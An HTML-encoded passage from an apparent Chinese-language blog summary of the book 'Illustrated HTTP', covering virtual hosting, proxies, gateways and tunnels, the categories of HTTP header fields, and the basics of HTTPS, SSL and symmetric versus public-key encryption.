<li>504 Gateway Timeout &#x72B6;&#x6001;&#x7801;&#x8868;&#x793A;&#x4EE3;&#x7406;&#x65E0;&#x6CD5;&#x8FDE;&#x901A;&#x6E90;&#x670D;&#x52A1;&#x5668;&#x518D;&#x6B21;&#x83B7;&#x53D6;&#x6709;&#x6548;&#x8D44;&#x6E90;&#x7684;&#x8BDD;&#xFF0C;&#x7F13;&#x5B58;&#x5FC5;&#x987B;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x4E00;&#x6761;&#x72B6;&#x6001;&#x7801;&#x3002;</li>
</ul>
<h2 id="%E4%B8%8Ehttp%E5%8D%8F%E4%BD%9C%E7%9A%84web%E6%9C%8D%E5%8A%A1%E5%99%A8">&#x4E0E;HTTP&#x534F;&#x4F5C;&#x7684;Web&#x670D;&#x52A1;&#x5668;</h2>
<p>HTTP/1.1&#x89C4;&#x8303;&#x5141;&#x8BB8;&#x4E00;&#x53F0;HTTP&#x670D;&#x52A1;&#x5668;&#x642D;&#x5EFA;&#x591A;&#x4E2A;Web&#x7AD9;&#x70B9;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x63D0;&#x4F9B;Web&#x6258;&#x7BA1;&#x670D;&#x52A1;&#xFF08;Web Hosting Service&#xFF09;&#x7684;&#x4F9B;&#x5E94;&#x5546;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x4E3A;&#x591A;&#x4F4D;&#x5BA2;&#x6237;&#x670D;&#x52A1;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4EE5;&#x6BCF;&#x4F4D;&#x5BA2;&#x6237;&#x6301;&#x6709;&#x7684;&#x57DF;&#x540D;&#x8FD0;&#x884C;&#x5404;&#x81EA;&#x4E0D;&#x540C;&#x7684;&#x7F51;&#x7AD9;&#x3002;&#x5728;&#x76F8;&#x540C;&#x7684;IP&#x5730;&#x5740;&#x4E0B;&#xFF0C;&#x7531;&#x4E8E;&#x865A;&#x62DF;&#x4E3B;&#x673A;&#x53EF;&#x4EE5;&#x5BC4;&#x5B58;&#x591A;&#x4E2A;&#x4E0D;&#x540C;&#x4E3B;&#x673A;&#x540D;&#x548C;&#x57DF;&#x540D;&#x7684;Web&#x7F51;&#x7AD9;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x53D1;&#x9001;HTTP&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x5728;Host&#x9996;&#x90E8;&#x5185;&#x5B8C;&#x6574;&#x6307;&#x5B9A;&#x4E3B;&#x673A;&#x540D;&#x6216;&#x57DF;&#x540D;&#x7684;URI&#x3002;</p>
<p>HTTP&#x901A;&#x4FE1;&#x65F6;&#xFF0C;&#x9664;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4EE5;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x7528;&#x4E8E;&#x901A;&#x4FE1;&#x6570;&#x636E;&#x8F6C;&#x53D1;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x4F8B;&#x5982;&#x4EE3;&#x7406;&#x3001;&#x7F51;&#x5173;&#x548C;&#x96A7;&#x9053;&#x3002;&#x5B83;&#x4EEC;&#x53EF;&#x4EE5;&#x914D;&#x5408;&#x670D;&#x52A1;&#x5668;&#x5DE5;&#x4F5C;&#x3002;&#x8FD9;&#x4E9B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x548C;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x5C06;&#x8BF7;&#x6C42;&#x8F6C;&#x53D1;&#x7ED9;&#x901A;&#x4FE1;&#x7EBF;&#x8DEF;&#x4E0A;&#x7684;&#x4E0B;&#x4E00;&#x7AD9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E76;&#x4E14;&#x80FD;&#x63A5;&#x6536;&#x4ECE;&#x90A3;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x7684;&#x54CD;&#x5E94;&#x518D;&#x8F6C;&#x53D1;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</p>
<p>&#x4EE3;&#x7406;&#x662F;&#x4E00;&#x79CD;&#x6709;&#x8F6C;&#x53D1;&#x529F;&#x80FD;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x5B83;&#x626E;&#x6F14;&#x4E86;&#x4F4D;&#x4E8E;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x201C;&#x4E2D;&#x95F4;&#x4EBA;&#x201D;&#x7684;&#x89D2;&#x8272;&#xFF0C;&#x63A5;&#x6536;&#x7531;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x7684;&#x8BF7;&#x6C42;&#x5E76;&#x8F6C;&#x53D1;&#x7ED9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x540C;&#x65F6;&#x4E5F;&#x63A5;&#x6536;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x5E76;&#x8F6C;&#x53D1;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x7F51;&#x5173;&#x662F;&#x8F6C;&#x53D1;&#x5176;&#x4ED6;&#x670D;&#x52A1;&#x5668;&#x901A;&#x4FE1;&#x6570;&#x636E;&#x7684;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x63A5;&#x6536;&#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x53D1;&#x9001;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x5B83;&#x5C31;&#x50CF;&#x81EA;&#x5DF1;&#x62E5;&#x6709;&#x8D44;&#x6E90;&#x7684;&#x6E90;&#x670D;&#x52A1;&#x5668;&#x4E00;&#x6837;&#x5BF9;&#x8BF7;&#x6C42;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;&#x6709;&#x65F6;&#x5BA2;&#x6237;&#x7AEF;&#x53EF;&#x80FD;&#x90FD;&#x4E0D;&#x4F1A;&#x5BDF;&#x89C9;&#xFF0C;&#x81EA;&#x5DF1;&#x7684;&#x901A;&#x4FE1;&#x76EE;&#x6807;&#x662F;&#x4E00;&#x4E2A;&#x7F51;&#x5173;&#x3002;&#x96A7;&#x9053;&#x662F;&#x5728;&#x76F8;&#x9694;&#x751A;&#x8FDC;&#x7684;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x4E24;&#x8005;&#x4E4B;&#x95F4;&#x8FDB;&#x884C;&#x4E2D;&#x8F6C;&#xFF0C;&#x5E76;&#x4FDD;&#x6301;&#x53CC;&#x65B9;&#x901A;&#x4FE1;&#x8FDE;&#x63A5;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF0C;&#x76EE;&#x7684;&#x662F;&#x786E;&#x4FDD;&#x5BA2;&#x6237;&#x7AEF;&#x80FD;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x884C;&#x5B89;&#x5168;&#x7684;&#x901A;&#x4FE1;&#x3002;</p>
<h2 id="http%E9%A6%96%E9%83%A8">HTTP&#x9996;&#x90E8;</h2>
<p>HTTP&#x534F;&#x8BAE;&#x7684;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E2D;&#x5FC5;&#x5B9A;&#x5305;&#x542B;HTTP&#x9996;&#x90E8;&#x3002;&#x9996;&#x90E8;&#x5185;&#x5BB9;&#x4E3A;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x5206;&#x522B;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x63D0;&#x4F9B;&#x6240;&#x9700;&#x8981;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x5BF9;&#x4E8E;&#x5BA2;&#x6237;&#x7AEF;&#x7528;&#x6237;&#x6765;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E9B;&#x4FE1;&#x606F;&#x4E2D;&#x7684;&#x5927;&#x90E8;&#x5206;&#x5185;&#x5BB9;&#x90FD;&#x65E0;&#x987B;&#x4EB2;&#x81EA;&#x67E5;&#x770B;&#x3002;</p>
<p>HTTP&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x662F;&#x7531;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x540D;&#x548C;&#x5B57;&#x6BB5;&#x503C;&#x6784;&#x6210;&#x7684;&#xFF0C;&#x4E2D;&#x95F4;&#x7528;&#x5192;&#x53F7; &quot;:&quot; &#x5206;&#x9694;&#x3002;</p>
<pre><code class="language-javascript">// &#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x540D;&#xFF1A; &#x5B57;&#x6BB5;&#x503C;
Content-Type: text/html // &#x62A5;&#x6587;&#x4E3B;&#x4F53;&#x7684;&#x5BF9;&#x8C61;&#x7C7B;&#x578B;
Keep-Alive: timeout=15, max=100...
</code></pre>
<p>HTTP&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x7528;&#x9014;&#x88AB;&#x5206;&#x4E3A;&#x4EE5;&#x4E0B;4&#x79CD;&#x7C7B;&#x578B;&#x3002;<br>
&#x901A;&#x7528;&#x9996;&#x90E8;&#x5B57;&#x6BB5; General Header Fields &#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x548C;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x4E24;&#x65B9;&#x90FD;&#x4F1A;&#x4F7F;&#x7528;&#x7684;&#x9996;&#x90E8;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/Common-header-field.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<p>&#x8BF7;&#x6C42;&#x9996;&#x90E8;&#x5B57;&#x6BB5; Request Header Fields &#x4ECE;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x9996;&#x90E8;&#x3002;&#x8865;&#x5145;&#x4E86;&#x8BF7;&#x6C42;&#x7684;&#x9644;&#x52A0;&#x5185;&#x5BB9;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x4FE1;&#x606F;&#x3001;&#x54CD;&#x5E94;&#x5185;&#x5BB9;&#x76F8;&#x5173;&#x4F18;&#x5148;&#x7EA7;&#x7B49;&#x4FE1;&#x606F;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/Request-header-field.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<p>&#x54CD;&#x5E94;&#x9996;&#x90E8;&#x5B57;&#x6BB5; Response Header Fields &#x4ECE;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5411;&#x5BA2;&#x6237;&#x7AEF;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x9996;&#x90E8;&#x3002;&#x8865;&#x5145;&#x4E86;&#x54CD;&#x5E94;&#x7684;&#x9644;&#x52A0;&#x5185;&#x5BB9;&#xFF0C;&#x4E5F;&#x4F1A;&#x8981;&#x6C42;&#x5BA2;&#x6237;&#x7AEF;&#x9644;&#x52A0;&#x989D;&#x5916;&#x7684;&#x5185;&#x5BB9;&#x4FE1;&#x606F;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/Response-header-field.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<p>&#x5B9E;&#x4F53;&#x9996;&#x90E8;&#x5B57;&#x6BB5; Entity Header Fields &#x9488;&#x5BF9;&#x8BF7;&#x6C42;&#x62A5;&#x6587;&#x548C;&#x54CD;&#x5E94;&#x62A5;&#x6587;&#x7684;&#x5B9E;&#x4F53;&#x90E8;&#x5206;&#x4F7F;&#x7528;&#x7684;&#x9996;&#x90E8;&#x3002;&#x8865;&#x5145;&#x4E86;&#x8D44;&#x6E90;&#x5185;&#x5BB9;&#x66F4;&#x65B0;&#x65F6;&#x95F4;&#x7B49;&#x4E0E;&#x5B9E;&#x4F53;&#x6709;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x3002;</p>
<p><img src="https://www.zairesinatra.com/content/images/2021/12/Entity-header-field.png" alt="&#x56FE;&#x89E3; HTTP &#x6458;&#x8981;" loading="lazy"></p>
<p>&#x5728;HTTP&#x534F;&#x8BAE;&#x901A;&#x4FE1;&#x4EA4;&#x4E92;&#x4E2D;&#x4F7F;&#x7528;&#x5230;&#x7684;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#xFF0C;&#x4E0D;&#x9650;&#x4E8E;RFC2616&#x4E2D;&#x5B9A;&#x4E49;&#x7684;47&#x79CD;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x3002;&#x8FD8;&#x6709;Cookie&#x3001;Set-Cookie&#x548C;Content-Disposition&#x7B49;&#x5728;&#x5176;&#x4ED6;RFC&#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#xFF0C;&#x5B83;&#x4EEC;&#x7684;&#x4F7F;&#x7528;&#x9891;&#x7387;&#x4E5F;&#x5F88;&#x9AD8;&#x3002;<br>
&#x8FD9;&#x4E9B;&#x975E;&#x6B63;&#x5F0F;&#x7684;&#x9996;&#x90E8;&#x5B57;&#x6BB5;&#x7EDF;&#x4E00;&#x5F52;&#x7EB3;&#x5728;RFC4229 HTTP Header Field Registrations&#x4E2D;&#x3002;</p>
<h2 id="%E7%A1%AE%E4%BF%9Dweb%E5%AE%89%E5%85%A8%E7%9A%84https">&#x786E;&#x4FDD;Web&#x5B89;&#x5168;&#x7684;HTTPS</h2>
<p>&#x901A;&#x4FE1;&#x4F7F;&#x7528;&#x660E;&#x6587;&#xFF08;&#x4E0D;&#x52A0;&#x5BC6;&#xFF09;&#xFF0C;&#x5185;&#x5BB9;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x7A83;&#x542C;&#xFF1B;&#x4E0D;&#x9A8C;&#x8BC1;&#x901A;&#x4FE1;&#x65B9;&#x7684;&#x8EAB;&#x4EFD;&#xFF0C;&#x56E0;&#x6B64;&#x6709;&#x53EF;&#x80FD;&#x906D;&#x9047;&#x4F2A;&#x88C5;&#xFF1B;&#x65E0;&#x6CD5;&#x8BC1;&#x660E;&#x62A5;&#x6587;&#x7684;&#x5B8C;&#x6574;&#x6027;&#xFF0C;&#x6240;&#x4EE5;&#x6709;&#x53EF;&#x80FD;&#x5DF2;&#x906D;&#x7BE1;&#x6539;&#x3002;&#x8FD9;&#x4E9B;&#x90FD;&#x662F;HTTP&#x7684;&#x4E0D;&#x8DB3;&#xFF0C;&#x540C;&#x7406;&#x5176;&#x4ED6;&#x672A;&#x52A0;&#x5BC6;&#x7684;&#x534F;&#x8BAE;&#x4E2D;&#x4E5F;&#x4F1A;&#x5B58;&#x5728;&#x8FD9;&#x7C7B;&#x95EE;&#x9898;&#x3002;</p>
<ul>
<li>&#x901A;&#x4FE1;&#x7684;&#x52A0;&#x5BC6;</li>
</ul>
<p>HTTP&#x534F;&#x8BAE;&#x4E2D;&#x6CA1;&#x6709;&#x52A0;&#x5BC6;&#x673A;&#x5236;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x548C;SSL&#xFF08;Secure Socket Layer&#xFF0C;&#x5B89;&#x5168;&#x5957;&#x63A5;&#x5C42;&#xFF09;&#x6216;TLS&#xFF08;Transport Layer Security&#xFF0C;&#x5B89;&#x5168;&#x4F20;&#x8F93;&#x5C42;&#x534F;&#x8BAE;&#xFF09;&#x7684;&#x7EC4;&#x5408;&#x4F7F;&#x7528;&#xFF0C;&#x52A0;&#x5BC6;HTTP&#x7684;&#x901A;&#x4FE1;&#x5185;&#x5BB9;&#x3002;&#x7528;SSL&#x5EFA;&#x7ACB;&#x5B89;&#x5168;&#x901A;&#x4FE1;&#x7EBF;&#x8DEF;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x5728;&#x8FD9;&#x6761;&#x7EBF;&#x8DEF;&#x4E0A;&#x8FDB;&#x884C;HTTP&#x901A;&#x4FE1;&#x4E86;&#x3002;&#x4E0E;SSL&#x7EC4;&#x5408;&#x4F7F;&#x7528;&#x7684;HTTP&#x88AB;&#x79F0;&#x4E3A;HTTPS&#xFF08;HTTP Secure&#xFF0C;&#x8D85;&#x6587;&#x672C;&#x4F20;&#x8F93;&#x5B89;&#x5168;&#x534F;&#x8BAE;&#xFF09;&#x6216;HTTP over SSL&#x3002;</p>
<ul>
<li>&#x5185;&#x5BB9;&#x7684;&#x52A0;&#x5BC6;</li>
</ul>
<p>&#x7531;&#x4E8E;HTTP&#x534F;&#x8BAE;&#x4E2D;&#x6CA1;&#x6709;&#x52A0;&#x5BC6;&#x673A;&#x5236;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5BF9;HTTP&#x534F;&#x8BAE;&#x4F20;&#x8F93;&#x7684;&#x5185;&#x5BB9;&#x672C;&#x8EAB;&#x52A0;&#x5BC6;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x9700;&#x8981;&#x5BF9;HTTP&#x62A5;&#x6587;&#x8FDB;&#x884C;&#x52A0;&#x5BC6;&#x5904;&#x7406;&#x540E;&#x518D;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x3002;&#x4E3A;&#x4E86;&#x505A;&#x5230;&#x6709;&#x6548;&#x7684;&#x5185;&#x5BB9;&#x52A0;&#x5BC6;&#xFF0C;&#x524D;&#x63D0;&#x662F;&#x8981;&#x6C42;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x540C;&#x65F6;&#x5177;&#x5907;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x673A;&#x5236;&#x3002;</p>
<p>HTTP&#x534F;&#x8BAE;&#x4E2D;&#x7684;&#x8BF7;&#x6C42;&#x548C;&#x54CD;&#x5E94;&#x4E0D;&#x4F1A;&#x5BF9;&#x901A;&#x4FE1;&#x65B9;&#x8FDB;&#x884C;&#x786E;&#x8BA4;&#x3002;&#x4EFB;&#x4F55;&#x4EBA;&#x90FD;&#x53EF;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x4E0D;&#x8BBA;&#x662F;&#x8C01;&#x53D1;&#x9001;&#x8FC7;&#x6765;&#x7684;&#x8BF7;&#x6C42;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x54CD;&#x5E94;&#xFF0C;&#x56E0;&#x6B64;&#x4E0D;&#x786E;&#x8BA4;&#x901A;&#x4FE1;&#x65B9;&#xFF0C;&#x4F1A;&#x5B58;&#x5728;&#x5404;&#x79CD;&#x9690;&#x60A3;&#x4EE5;&#x53CA;&#x6D77;&#x91CF;&#x8BF7;&#x6C42;&#x4E0B;&#x7684;DoS&#x653B;&#x51FB;&#x3002;&#x867D;&#x7136;&#x4F7F;&#x7528;HTTP&#x534F;&#x8BAE;&#x65E0;&#x6CD5;&#x786E;&#x5B9A;&#x901A;&#x4FE1;&#x65B9;&#xFF0C;&#x4F46;&#x5982;&#x679C;&#x4F7F;&#x7528;SSL&#x5219;&#x53EF;&#x4EE5;&#x3002;SSL&#x4E0D;&#x4EC5;&#x63D0;&#x4F9B;&#x52A0;&#x5BC6;&#x5904;&#x7406;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x4F7F;&#x7528;&#x4E86;&#x4E00;&#x79CD;&#x88AB;&#x79F0;&#x4E3A;&#x8BC1;&#x4E66;&#x7684;&#x624B;&#x6BB5;&#xFF0C;&#x53EF;&#x7528;&#x4E8E;&#x786E;&#x5B9A;&#x65B9;&#x3002;&#x8BC1;&#x4E66;&#x7531;&#x503C;&#x5F97;&#x4FE1;&#x4EFB;&#x7684;&#x7B2C;&#x4E09;&#x65B9;&#x673A;&#x6784;&#x9881;&#x53D1;&#xFF0C;&#x7528;&#x4EE5;&#x8BC1;&#x660E;&#x670D;&#x52A1;&#x5668;&#x548C;&#x5BA2;&#x6237;&#x7AEF;&#x662F;&#x5B9E;&#x9645;&#x5B58;&#x5728;&#x7684;&#x3002;</p>
<p>&#x7531;&#x4E8E;HTTP&#x534F;&#x8BAE;&#x65E0;&#x6CD5;&#x8BC1;&#x660E;&#x901A;&#x4FE1;&#x7684;&#x62A5;&#x6587;&#x5B8C;&#x6574;&#x6027;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x9001;&#x51FA;&#x4E4B;&#x540E;&#x76F4;&#x5230;&#x5BF9;&#x65B9;&#x63A5;&#x6536;&#x4E4B;&#x524D;&#x7684;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x5185;&#xFF0C;&#x5373;&#x4F7F;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x7684;&#x5185;&#x5BB9;&#x906D;&#x5230;&#x7BE1;&#x6539;&#xFF0C;&#x4E5F;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x83B7;&#x6089;&#x3002;&#x50CF;&#x8FD9;&#x6837;&#xFF0C;&#x8BF7;&#x6C42;&#x6216;&#x54CD;&#x5E94;&#x5728;&#x4F20;&#x8F93;&#x9014;&#x4E2D;&#xFF0C;&#x906D;&#x653B;&#x51FB;&#x8005;&#x62E6;&#x622A;&#x5E76;&#x7BE1;&#x6539;&#x5185;&#x5BB9;&#x7684;&#x653B;&#x51FB;&#x79F0;&#x4E3A;&#x4E2D;&#x95F4;&#x4EBA;&#x653B;&#x51FB;&#xFF08;Man-in-the-Middle attack,MITM&#xFF09;&#x3002;&#x867D;&#x7136;&#x6709;&#x4F7F;&#x7528;HTTP&#x534F;&#x8BAE;&#x786E;&#x5B9A;&#x62A5;&#x6587;&#x5B8C;&#x6574;&#x6027;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4F46;&#x4E8B;&#x5B9E;&#x4E0A;&#x5E76;&#x4E0D;&#x4FBF;&#x6377;&#x3001;&#x53EF;&#x9760;&#x3002;&#x5176;&#x4E2D;&#x5E38;&#x7528;&#x7684;&#x662F;MD5&#x548C;SHA-1&#x7B49;&#x6563;&#x5217;&#x503C;&#x6821;&#x9A8C;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4EE5;&#x53CA;&#x7528;&#x6765;&#x786E;&#x8BA4;&#x6587;&#x4EF6;&#x7684;&#x6570;&#x5B57;&#x7B7E;&#x540D;&#x65B9;&#x6CD5;&#xFF08;&#x9632;&#x6B62;&#x7BE1;&#x6539;&#xFF09;&#x3002;</p>
<p>&#x901A;&#x5E38;&#xFF0C;HTTP&#x76F4;&#x63A5;&#x548C;TCP&#x901A;&#x4FE1;&#x3002;&#x5F53;&#x4F7F;&#x7528;SSL&#x65F6;&#xFF0C;&#x5219;&#x6F14;&#x53D8;&#x6210;&#x5148;&#x548C;SSL&#x901A;&#x4FE1;&#xFF0C;&#x518D;&#x7531;SSL&#x548C;TCP&#x901A;&#x4FE1;&#x4E86;&#x3002;&#x7B80;&#x8A00;&#x4E4B;&#xFF0C;&#x6240;&#x8C13;HTTPS&#xFF0C;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x8EAB;&#x62AB;SSL&#x534F;&#x8BAE;&#x8FD9;&#x5C42;&#x5916;&#x58F3;&#x7684;HTTP&#x3002;&#x5728;&#x91C7;&#x7528;SSL&#x540E;&#xFF0C;HTTP&#x5C31;&#x62E5;&#x6709;&#x4E86;HTTPS&#x7684;&#x52A0;&#x5BC6;&#x3001;&#x8BC1;&#x4E66;&#x548C;&#x5B8C;&#x6574;&#x6027;&#x4FDD;&#x62A4;&#x8FD9;&#x4E9B;&#x529F;&#x80FD;&#x3002;SSL&#x662F;&#x72EC;&#x7ACB;&#x4E8E;HTTP&#x7684;&#x534F;&#x8BAE;&#xFF0C;&#x6240;&#x4EE5;&#x4E0D;&#x5149;&#x662F;HTTP&#x534F;&#x8BAE;&#xFF0C;&#x5176;&#x4ED6;&#x8FD0;&#x884C;&#x5728;&#x5E94;&#x7528;&#x5C42;&#x7684;SMTP&#x548C;Telnet&#x7B49;&#x534F;&#x8BAE;&#x5747;&#x53EF;&#x914D;&#x5408;SSL&#x534F;&#x8BAE;&#x4F7F;&#x7528;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;SSL&#x662F;&#x5F53;&#x4ECA;&#x4E16;&#x754C;&#x4E0A;&#x5E94;&#x7528;&#x6700;&#x4E3A;&#x5E7F;&#x6CDB;&#x7684;&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x6280;&#x672F;&#x3002;</p>
<p>&#x5728;&#x5BF9;SSL&#x8FDB;&#x884C;&#x8BB2;&#x89E3;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x6765;&#x4E86;&#x89E3;&#x4E00;&#x4E0B;&#x52A0;&#x5BC6;&#x65B9;&#x6CD5;&#x3002;&#x8FD1;&#x4EE3;&#x7684;&#x52A0;&#x5BC6;&#x65B9;&#x6CD5;&#x4E2D;&#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x662F;&#x516C;&#x5F00;&#x7684;&#xFF0C;&#x800C;&#x5BC6;&#x94A5;&#x5374;&#x662F;&#x4FDD;&#x5BC6;&#x7684;&#x3002;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x90FD;&#x4F1A;&#x7528;&#x5230;&#x5BC6;&#x94A5;&#x3002;&#x6CA1;&#x6709;&#x5BC6;&#x94A5;&#x5C31;&#x65E0;&#x6CD5;&#x5BF9;&#x5BC6;&#x7801;&#x89E3;&#x5BC6;&#xFF0C;&#x53CD;&#x8FC7;&#x6765;&#x8BF4;&#xFF0C;&#x4EFB;&#x4F55;&#x4EBA;&#x53EA;&#x8981;&#x6301;&#x6709;&#x5BC6;&#x94A5;&#x5C31;&#x80FD;&#x89E3;&#x5BC6;&#x4E86;&#x3002;&#x5982;&#x679C;&#x5BC6;&#x94A5;&#x88AB;&#x653B;&#x51FB;&#x8005;&#x83B7;&#x5F97;&#xFF0C;&#x90A3;&#x52A0;&#x5BC6;&#x4E5F;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x610F;&#x4E49;&#x3002;&#x52A0;&#x5BC6;&#x548C;&#x89E3;&#x5BC6;&#x540C;&#x7528;&#x4E00;&#x4E2A;&#x5BC6;&#x94A5;&#x7684;&#x65B9;&#x5F0F;&#x79F0;&#x4E3A;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#xFF08;Common key crypto system&#xFF09;&#xFF0C;&#x4E5F;&#x88AB;&#x53EB;&#x505A;<strong>&#x5BF9;&#x79F0;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;</strong>&#x3002;&#x4EE5;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x65B9;&#x5F0F;&#x52A0;&#x5BC6;&#x65F6;&#x5FC5;&#x987B;&#x5C06;&#x5BC6;&#x94A5;&#x4E5F;&#x53D1;&#x7ED9;&#x5BF9;&#x65B9;&#x3002;&#x53EF;&#x7A76;&#x7ADF;&#x600E;&#x6837;&#x624D;&#x80FD;&#x5B89;&#x5168;&#x5730;&#x8F6C;&#x4EA4;&#xFF1F;&#x8FD9;&#x65F6;&#x5171;&#x4EAB;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;&#x7684;&#x56F0;&#x5883;&#x3002;<strong>&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x52A0;&#x5BC6;</strong>&#x4F7F;&#x7528;&#x4E00;&#x5BF9;<strong>&#x975E;&#x5BF9;&#x79F0;&#x7684;&#x5BC6;&#x94A5;</strong>&#x3002;&#x4E00;&#x628A;&#x53EB;&#x505A;<strong>&#x79C1;&#x6709;&#x5BC6;&#x94A5;</strong>&#xFF08;private key&#xFF09;&#xFF0C;&#x53E6;&#x4E00;&#x628A;&#x53EB;&#x505A;<strong>&#x516C;&#x5F00;&#x5BC6;&#x94A5;</strong>&#xFF08;public key&#xFF09;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x79C1;&#x6709;&#x5BC6;&#x94A5;&#x4E0D;&#x80FD;&#x8BA9;&#x5176;&#x4ED6;&#x4EFB;&#x4F55;&#x4EBA;&#x77E5;&#x9053;&#xFF0C;&#x800C;&#x516C;&#x5F00;&#x5BC6;&#x94A5;&#x5219;&#x53EF;&#x4EE5;&#x968F;&#x610F;&#x53D1;&#x5E03;&#xFF0C;&#x4EFB;&#x4F55;&#x4EBA;&#x90FD;&#x53EF;&#x4EE5;&#x83B7;&#x5F97;&#x3002;<br>
